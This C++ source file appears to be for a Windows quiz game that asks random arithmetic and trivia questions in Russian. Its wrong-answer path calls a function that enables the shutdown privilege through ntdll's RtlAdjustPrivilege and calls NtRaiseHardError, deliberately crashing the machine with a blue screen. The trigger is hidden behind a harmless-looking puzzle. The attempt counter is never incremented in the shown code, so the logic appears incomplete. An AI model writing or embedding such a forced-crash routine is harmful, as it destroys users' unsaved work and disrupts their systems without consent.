#include "NotPuzzle.hpp"

enum class NotPuzzle::taskType { math, voprosNaMillion, count };

NotPuzzle::NotPuzzleTaskManager::NotPuzzleTaskManager() {
	generateTask();
}

void NotPuzzle::NotPuzzleTaskManager::attemptTask() {
	std::cout << m_task->getTaskForUser() << '\n';
	std::string userAnswer;
	std::cin >> userAnswer;
	if (userAnswer == m_task->getCorrectAnswer()) {
		std::cout << "Верно!" << std::endl;
		return;
	}
	else {
		std::cout << "Не верно!" << std::endl;
		if (attempts >= maxAttemptsBeforeBanNahuj) {
			pizdato();
		}

		generateTask();
		attemptTask();
	}

}

std::shared_ptr<NotPuzzle::Task> NotPuzzle::NotPuzzleTaskManager::getTask() const {
	return m_task;
}

void NotPuzzle::NotPuzzleTaskManager::generateTask() {
	switch (static_cast<taskType>(getRandom(static_cast<int>(taskType::count), 0))) {
	case (taskType::math):
		m_task = std::make_shared<MathTask>();
		break;
	case (taskType::voprosNaMillion):
		m_task = std::make_shared<VoprosNaMillion>();
		break;
	}
}

int NotPuzzle::getRandom(const int &max, const bool &sign) {
	std::random_device rd;
    std::mt19937 gen(rd());

    std::uniform_int_distribution<> dis(0, max-1);

    return dis(gen);
}

std::string NotPuzzle::getStringFromDeque(const std::deque<std::string> deq) {
	std::string result = "";
	for (int i = 0; i < deq.size(); i++) {
		result += deq[i];
		if (i != deq.size() - 1) result += " ";
	}
	
	return result;
}

void NotPuzzle::pizdato() {
	typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
	typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
	BOOLEAN f;
	ULONG u;
	LPVOID s = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID l = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege t = (pdef_RtlAdjustPrivilege)s;
	pdef_NtRaiseHardError N = (pdef_NtRaiseHardError)l;
	NTSTATUS NtRet = t(19, TRUE, FALSE, &f);
	N(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &u);
}

NotPuzzle::MathTask::MathTask() {
	int taskLength = getRandom(maxMathTaskLenght, 0);
	if (getRandom(2, 0) == 1) {
		m_taskForParser.push_back("-");
	}
	m_taskForParser.push_back(std::to_string(getRandom(maxMathTaskNumber, 0)));
	for (int i = 0; i < taskLength; i++) {
		m_taskForParser.push_back(operators.at(getRandom(operators.size(), 0)));
		if (getRandom(2, 0) == 1) {
			m_taskForParser.push_back("-");
		}
		m_taskForParser.push_back(std::to_string(getRandom(maxMathTaskNumber, 0)));
	}
	m_taskForParser.push_back("");


	Parser p(m_taskForParser);
	m_correctAnswer = std::to_string(static_cast<int>(eval(p.parse())));
	m_taskForUser = getStringFromDeque(m_taskForParser);
}

NotPuzzle::VoprosNaMillion::VoprosNaMillion() {
	std::pair<std::string, std::string> voprosOtsos = voprosOtvetNaMillion.at(getRandom(voprosOtvetNaMillion.size(), 0));
	m_taskForUser = voprosOtsos.first;
	m_correctAnswer = voprosOtsos.second;
	m_taskForParser = {"чобля"};
}

std::deque<std::string> NotPuzzle::Task::getTaskForParser() const {
	return m_taskForParser;
}

std::string NotPuzzle::Task::getTaskForUser() const {
	return m_taskForUser;
}

std::string NotPuzzle::Task::getCorrectAnswer() const {
	return m_correctAnswer;
}
